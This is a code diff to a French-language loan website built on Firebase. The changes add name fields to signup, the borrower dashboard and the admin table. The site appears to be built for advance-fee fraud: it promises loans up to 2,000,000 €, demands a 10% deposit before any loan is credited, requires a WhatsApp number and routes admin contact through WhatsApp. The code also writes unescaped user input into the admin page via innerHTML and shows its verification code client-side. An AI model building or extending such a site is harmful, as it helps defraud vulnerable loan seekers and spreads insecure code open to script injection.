@@ -115,13 +115,13 @@
             </div>
         </section>
 
-        <!-- Espace Client : Type de Prêt, Revenus & WhatsApp -->
+        <!-- Espace Client : Nom, Prénom, Type de Prêt, Revenus & WhatsApp -->
         <section id="sec-client-space" class="hidden space-y-8">
             <div class="bg-white rounded-3xl shadow-sm border border-slate-200 p-6 md:p-10 space-y-6">
                 <div class="flex flex-col md:flex-row justify-between items-start md:items-center border-b pb-4 gap-4">
                     <div>
                         <h2 class="text-2xl font-bold text-slate-900" data-i18n="dashTitle">Tableau de Bord Emprunteur</h2>
-                        <p class="text-xs text-slate-500 mt-1" data-i18n="dashSubtitle">Suivi de votre dossier de financement européen.</p>
+                        <p class="text-xs text-slate-500 mt-1">Bienvenue, <span id="client-welcome-name" class="font-bold text-brand-600">Client</span> — Suivi de votre dossier européen.</p>
                     </div>
                     <div class="flex items-center space-x-3">
                         <span class="px-3 py-1 bg-amber-50 text-amber-700 border border-amber-200 rounded-full text-xs font-semibold" id="client-status-badge">Statut : En attente de demande de prêt</span>
@@ -130,10 +130,14 @@
                 </div>
 
                 <!-- Grille d'information du dossier -->
-                <div class="grid grid-cols-1 md:grid-cols-5 gap-4">
+                <div class="grid grid-cols-1 md:grid-cols-6 gap-4">
+                    <div class="p-4 bg-slate-50 rounded-xl border border-slate-200">
+                        <span class="text-xs font-semibold text-slate-500 uppercase">Nom & Prénom</span>
+                        <p class="text-sm font-bold text-slate-900 mt-1" id="dash-fullname">Non renseigné</p>
+                    </div>
                     <div class="p-4 bg-slate-50 rounded-xl border border-slate-200">
                         <span class="text-xs font-semibold text-slate-500 uppercase" data-i18n="dashRefLabel">Référence Dossier</span>
-                        <p class="text-lg font-mono font-bold text-slate-900 mt-1" id="dash-ref">DOS-2026-XXXX</p>
+                        <p class="text-sm font-mono font-bold text-slate-900 mt-1" id="dash-ref">DOS-2026-XXXX</p>
                     </div>
                     <div class="p-4 bg-slate-50 rounded-xl border border-slate-200">
                         <span class="text-xs font-semibold text-slate-500 uppercase">Type & Montant</span>
@@ -145,22 +149,22 @@
                     </div>
                     <div class="p-4 bg-slate-50 rounded-xl border border-slate-200">
                         <span class="text-xs font-semibold text-slate-500 uppercase" data-i18n="dashCountryLabel">Pays & Résidence</span>
-                        <p class="text-lg font-bold text-slate-900 mt-1" id="dash-country">France</p>
+                        <p class="text-sm font-bold text-slate-900 mt-1" id="dash-country">France</p>
                     </div>
                     <div class="p-4 bg-brand-50 rounded-xl border border-brand-200">
                         <span class="text-xs font-semibold text-brand-700 uppercase" data-i18n="dashDepositLabel">Apport Requis (10%)</span>
-                        <p class="text-lg font-bold text-brand-700 mt-1" id="dash-deposit-amount">0.00 €</p>
+                        <p class="text-sm font-bold text-brand-700 mt-1" id="dash-deposit-amount">0.00 €</p>
                     </div>
                 </div>
 
-                <!-- ÉTAPE 1 : FORMULAIRE DE DEMANDE AVEC TYPE DE PRÊT, REVENU MENSUEL & WHATSAPP -->
+                <!-- ÉTAPE 1 : FORMULAIRE DE DEMANDE DE PRÊT -->
                 <div id="loan-request-box" class="bg-amber-50 border border-amber-300 rounded-2xl p-6 space-y-4 shadow-sm">
                     <div class="flex items-center space-x-3 text-amber-800">
                         <i data-lucide="alert-circle" class="w-6 h-6"></i>
                         <h3 class="font-bold text-lg">Étape 1 : Soumettez votre Demande de Prêt (Jusqu'à 2 000 000 €)</h3>
                     </div>
                     <p class="text-xs text-slate-700 leading-relaxed">
-                        Veuillez renseigner le type de prêt, le montant, vos <strong>revenus mensuels</strong> et votre <strong>numéro WhatsApp indispensable</strong> avant que votre prêt soit crédité sur votre tableau de bord.
+                        Veuillez renseigner le type de prêt, le montant, vos <strong>revenus mensuels</strong> et votre <strong>numéro WhatsApp indispensable</strong> avant que votre prêt soit crédité.
                     </p>
                     <form onsubmit="submitLoanApplication(event)" class="grid grid-cols-1 md:grid-cols-4 gap-4 text-xs pt-2">
                         <div>
@@ -194,7 +198,7 @@
                     </form>
                 </div>
 
-                <!-- ÉTAPE 2 : DEMANDE DE VIREMENT (S'active après approbation admin) -->
+                <!-- ÉTAPE 2 : DEMANDE DE VIREMENT -->
                 <div id="transfer-box" class="hidden border border-emerald-200 bg-emerald-50/50 rounded-2xl p-6 space-y-4">
                     <div class="flex items-center space-x-3 text-emerald-700">
                         <i data-lucide="arrow-up-right" class="w-6 h-6"></i>
@@ -260,7 +264,7 @@
                 <div class="flex justify-between items-center border-b pb-4">
                     <div>
                         <h2 class="text-2xl font-bold text-slate-900">Espace Administration & Validation des Dossiers</h2>
-                        <p class="text-xs text-slate-500">Gérez les demandes, consultez les revenus des emprunteurs et contactez-les via WhatsApp.</p>
+                        <p class="text-xs text-slate-500">Gérez les demandes, consultez l'identité des emprunteurs et contactez-les via WhatsApp.</p>
                     </div>
                     <button onclick="logoutClient()" class="px-3 py-1.5 text-xs font-semibold text-rose-600 border border-rose-200 hover:bg-rose-50 rounded-lg transition">Déconnexion Admin</button>
                 </div>
@@ -270,7 +274,8 @@
                         <thead>
                             <tr class="bg-slate-100 border-b text-slate-700">
                                 <th class="p-3">Référence</th>
-                                <th class="p-3">Client</th>
+                                <th class="p-3">Client (Nom & Prénom)</th>
+                                <th class="p-3">E-mail</th>
                                 <th class="p-3">WhatsApp</th>
                                 <th class="p-3">Type de Prêt</th>
                                 <th class="p-3">Montant</th>
@@ -299,6 +304,16 @@
             <div id="auth-error-box" class="hidden mb-4 p-3 bg-rose-50 border border-rose-200 text-rose-700 text-xs rounded-lg font-mono"></div>
 
             <form id="auth-main-form" onsubmit="handleAuthSubmit(event)" class="space-y-4">
+                <div id="signup-name-fields" class="grid grid-cols-2 gap-2 hidden">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-700 mb-1">Nom *</label>
+                        <input type="text" id="auth-lastname" placeholder="Ex: Goudjo" class="w-full px-3 py-2 border rounded-lg text-sm">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-700 mb-1">Prénom *</label>
+                        <input type="text" id="auth-firstname" placeholder="Ex: Jean" class="w-full px-3 py-2 border rounded-lg text-sm">
+                    </div>
+                </div>
                 <div>
                     <label class="block text-xs font-semibold text-slate-700 mb-1" data-i18n="lblEmail">Adresse E-mail (Gmail)</label>
                     <input type="email" id="auth-email" required class="w-full px-3 py-2 border rounded-lg text-sm">
@@ -307,7 +322,7 @@
                     <label class="block text-xs font-semibold text-slate-700 mb-1" data-i18n="lblPass">Mot de Passe</label>
                     <input type="password" id="auth-password" required minlength="6" class="w-full px-3 py-2 border rounded-lg text-sm">
                 </div>
-                <div id="signup-extra-fields" class="space-y-4">
+                <div id="signup-extra-fields" class="space-y-4 hidden">
                     <div>
                         <label class="block text-xs font-semibold text-slate-700 mb-1" data-i18n="lblCountry">Pays de résidence (UE - 27 États)</label>
                         <select id="auth-country" onchange="onCountrySelected(this.value)" class="w-full px-3 py-2 border rounded-lg text-sm">
@@ -420,6 +435,9 @@
                 const snap = await getDoc(doc(window.firebaseDb, "dossiers", docKey));
                 if (snap.exists()) {
                     const data = snap.data();
+                    const fullName = (data.lastName || "") + " " + (data.firstName || "");
+                    document.getElementById('client-welcome-name').textContent = fullName.trim() || data.userEmail;
+                    document.getElementById('dash-fullname').textContent = fullName.trim() || "Non renseigné";
                     document.getElementById('dash-ref').textContent = data.id || "DOS-2026-001";
                     document.getElementById('dash-country').textContent = data.country || "France";
                     
@@ -501,17 +519,19 @@
 
         async function loadAdminRequests() {
             const tableBody = document.getElementById('admin-requests-table');
-            tableBody.innerHTML = "<tr><td colspan='9' class='p-3 text-center'>Chargement des dossiers...</td></tr>";
+            tableBody.innerHTML = "<tr><td colspan='10' class='p-3 text-center'>Chargement des dossiers...</td></tr>";
             try {
                 const querySnap = await getDocs(collection(window.firebaseDb, "dossiers"));
                 tableBody.innerHTML = "";
                 querySnap.forEach((docSnap) => {
                     const data = docSnap.data();
+                    const fullName = (data.lastName || "") + " " + (data.firstName || "");
                     const tr = document.createElement('tr');
                     tr.className = "border-b hover:bg-slate-50";
                     tr.innerHTML = `
                         <td class="p-3 font-mono font-bold">${data.id || 'N/A'}</td>
-                        <td class="p-3">${data.userEmail}</td>
+                        <td class="p-3 font-semibold text-slate-900">${fullName.trim() || 'Non renseigné'}</td>
+                        <td class="p-3 text-slate-600">${data.userEmail}</td>
                         <td class="p-3 font-semibold text-emerald-600"><a href="https://wa.me/${data.whatsapp ? data.whatsapp.replace(/[^0-9]/g, '') : ''}" target="_blank" class="hover:underline">💬 ${data.whatsapp || 'Non renseigné'}</a></td>
                         <td class="p-3 font-semibold text-slate-800">${data.loanType || 'Non spécifié'}</td>
                         <td class="p-3 font-semibold text-brand-600">${data.loanAmount ? data.loanAmount.toLocaleString() + ' €' : 'Non demandé'}</td>
@@ -660,7 +680,7 @@
                 docsBtn: "Enviar documentos para validación",
                 modalTitle: "Espacio Prestatario", modalSub: "Por favor, identifíquese.",
                 lblEmail: "Dirección de correo electrónico (Gmail)", lblPass: "Contraseña", lblCountry: "País de residencia (UE - 27 Estados)",
-                lblLang: "Idioma da la interfaz", btnLoginSubmit: "Iniciar sesión",
+                lblLang: "Idioma de la interfaz", btnLoginSubmit: "Iniciar sesión",
                 lblOtpCode: "Introduce el código anterior:", btnVerifyCode: "Verificar Código y Crear Cuenta",
                 btnSignupStep: "Generar código en pantalla"
             },
@@ -740,7 +760,7 @@
                 resNote: "* O depósito de 10% constitui uma condição prévia obrigatória para validar o pedido de empréstimo.",
                 btnApply: "Fazer pedido oficial e Registar",
                 adv1Title: "Conformidade Europea", adv1Desc: "Estrito cumprimento das normas bancárias da União Europeia, garantindo total segurança das suas transações e dados pessoais.",
-                adv2Title: "Multilingue e 27 Estados", adv2Desc: "Plataforma disponível para todos os residentes do Espaço Economico Europeo com suporte linguistique automatizado.",
+                adv2Title: "Multilingue e 27 Estados", adv2Desc: "Plataforma disponível para todos os residentes do Espaço Economico Europeo com suporte linguístico automatizado.",
                 adv3Title: "Decisão Rápida", adv3Desc: "Acompanhamento em tempo real do seu dossier através do seu espaço pessoal seguro e processamento rigoroso pelos nossos especialistas.",
                 dashTitle: "Painel do Mutuário", dashSubtitle: "Acompanhamento do seu dossier de financiamento europeu.",
                 btnLogout: "Terminar sessão",
@@ -826,14 +846,22 @@
             document.getElementById('otp-verify-section').classList.add('hidden');
             document.getElementById('auth-main-form').classList.remove('hidden');
             const extraFields = document.getElementById('signup-extra-fields');
+            const nameFields = document.getElementById('signup-name-fields');
+
             if (type === 'login') {
                 document.getElementById('auth-modal-title').textContent = currentLang === 'en' ? 'Client Login' : currentLang === 'it' ? 'Accesso Cliente' : currentLang === 'es' ? 'Iniciar Sesión' : currentLang === 'de' ? 'Kunden-Login' : 'Connexion Client / Admin';
                 document.getElementById('auth-submit-btn').textContent = translations[currentLang].btnLoginSubmit;
                 extraFields.classList.add('hidden');
+                nameFields.classList.add('hidden');
+                document.getElementById('auth-lastname').removeAttribute('required');
+                document.getElementById('auth-firstname').removeAttribute('required');
             } else {
                 document.getElementById('auth-modal-title').textContent = currentLang === 'en' ? 'Client Registration' : currentLang === 'it' ? 'Registrazione Cliente' : currentLang === 'es' ? 'Registro de Cliente' : currentLang === 'de' ? 'Kundenregistrierung' : 'Inscription Client';
                 document.getElementById('auth-submit-btn').textContent = translations[currentLang].btnSignupStep;
                 extraFields.classList.remove('hidden');
+                nameFields.classList.remove('hidden');
+                document.getElementById('auth-lastname').setAttribute('required', 'true');
+                document.getElementById('auth-firstname').setAttribute('required', 'true');
             }
         }
 
@@ -848,6 +876,8 @@
             const password = document.getElementById('auth-password').value;
             const country = document.getElementById('auth-country').value;
             const lang = document.getElementById('auth-language').value;
+            const lastName = document.getElementById('auth-lastname').value.trim();
+            const firstName = document.getElementById('auth-firstname').value.trim();
 
             if (authMode === 'login') {
                 try {
@@ -858,7 +888,7 @@
                 }
             } else {
                 generatedOtpCode = Math.floor(100000 + Math.random() * 900000).toString();
-                pendingSignupData = { email, password, country, language: lang };
+                pendingSignupData = { email, password, country, language: lang, lastName, firstName };
 
                 document.getElementById('auth-main-form').classList.add('hidden');
                 document.getElementById('otp-verify-section').classList.remove('hidden');
@@ -881,7 +911,8 @@
                 await window.firebaseFns.setDoc(window.firebaseFns.doc(window.firebaseDb, "dossiers", docKey), {
                     id: "DOS-2026-" + Math.floor(100 + Math.random() * 900),
                     userEmail: pendingSignupData.email,
-                    userName: pendingSignupData.email.split('@')[0],
+                    lastName: pendingSignupData.lastName,
+                    firstName: pendingSignupData.firstName,
                     country: pendingSignupData.country,
                     language: pendingSignupData.language,
                     depositBalance: 0,
